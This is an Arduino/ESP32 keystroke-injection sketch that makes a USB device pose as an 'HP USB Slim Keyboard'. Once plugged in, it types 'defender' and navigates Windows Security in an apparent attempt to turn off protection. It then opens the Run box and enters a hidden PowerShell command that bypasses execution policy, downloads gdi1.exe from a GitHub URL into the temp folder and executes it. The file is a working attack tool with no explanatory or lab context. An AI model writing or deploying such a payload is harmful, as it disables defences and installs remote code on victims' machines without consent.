#include "USB.h"
#include "USBHIDKeyboard.h"
#include "keyboardLayout/Keyboard_de_DE.h"


USBHIDKeyboard Keyboard;

void tap(uint8_t key) {
  Keyboard.press(key);
  delay(40);
  Keyboard.release(key);
  delay(40);
}

void typeString(const char* str, unsigned int delayBetweenKeys = 4) {
  for (size_t i = 0; i < strlen(str); i++) {
    char c = str[i];
    Keyboard.press(c);
    delay(10);
    Keyboard.release(c);
    delay(delayBetweenKeys);
  }
}

void setup() {
  USB.productName("HP USB Slim Keyboard");
  USB.manufacturerName("Hewlett-Packard");
  USB.serialNumber("");
  USB.begin();
  Keyboard.begin(KeyboardLayout_de_DE);

  delay(1500);

  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("defender");
  delay(600);

  tap(KEY_RETURN);
  delay(1500);

  tap(KEY_RETURN);
  delay(1000);

  for (int i = 0; i < 4; i++) {
    tap(KEY_TAB);
    delay(200);
  }
  tap(KEY_RETURN);
  delay(1000);

  tap(KEY_SPACE);
  delay(1000);
  tap(KEY_LEFT_ARROW);
  delay(1000);
  tap(KEY_SPACE);
  delay(1000);


  Keyboard.press(KEY_LEFT_ALT);
  delay(150);
  Keyboard.press(KEY_F4);
  delay(150);
  Keyboard.release(KEY_F4);
  delay(150);
  Keyboard.release(KEY_LEFT_ALT);
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press('r');
  delay(200);
  Keyboard.release('r');
  delay(150);
  Keyboard.release(KEY_LEFT_GUI);
  delay(1200);

  const char* cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"cd $env:TEMP; Invoke-WebRequest -Uri https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/gdi1.exe -OutFile gdi1.exe; .\\gdi1.exe\"";
  typeString(cmd, 20);
  delay(700);
  tap(KEY_RETURN);

  Keyboard.releaseAll();
  Keyboard.end();
}

void loop() {
}